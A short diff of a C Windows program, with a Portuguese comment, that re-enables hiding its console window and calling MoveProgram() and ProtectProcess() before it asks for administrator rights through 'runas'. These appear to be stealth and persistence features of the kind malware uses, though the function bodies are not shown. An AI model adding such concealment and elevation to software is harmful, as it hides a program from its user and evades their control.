@@ -22,9 +22,9 @@ BOOL IsCurrentUserLocalAdministrator(void);
 
 int main(int argc, char* argv[])
 {
-	// ShowWindow(GetForegroundWindow(), SW_HIDE);
-	// MoveProgram();
-	// ProtectProcess();
+	ShowWindow(GetForegroundWindow(), SW_HIDE);
+	MoveProgram();
+	ProtectProcess();
 	
 	// Verifica se o programa possui permissões, se não possuir executa o ShellExecute com o verbo 'runas', para perdir permissão de administrador
 	if (!IsCurrentUserLocalAdministrator())
